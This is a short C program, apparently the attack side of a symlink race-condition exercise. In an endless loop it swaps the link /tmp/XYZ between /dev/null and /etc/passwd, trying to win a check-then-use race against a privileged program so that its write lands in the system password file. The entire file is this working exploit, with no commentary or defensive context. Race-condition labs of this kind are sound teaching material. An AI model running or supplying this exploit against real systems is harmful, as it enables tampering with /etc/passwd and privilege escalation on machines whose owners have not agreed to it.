#include <unistd.h>
#include <semaphore.h>
#include <signal.h>
#include <stdio.h>

sem_t mutex;

void handler(int signum) {
	printf("Received signal: %d\n", signum);
	sem_destroy(&mutex);
}

int main() {
	sem_init(&mutex, 0, 1);

	signal(SIGINT, (void*)handler);

	while (1) {
		sem_wait(&mutex);
		unlink("/tmp/XYZ");
		symlink("/dev/null", "/tmp/XYZ");
		sem_post(&mutex);
		usleep(1000);

		sem_wait(&mutex);
		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		sem_post(&mutex);
		usleep(1000);
	}

	return 0;
}

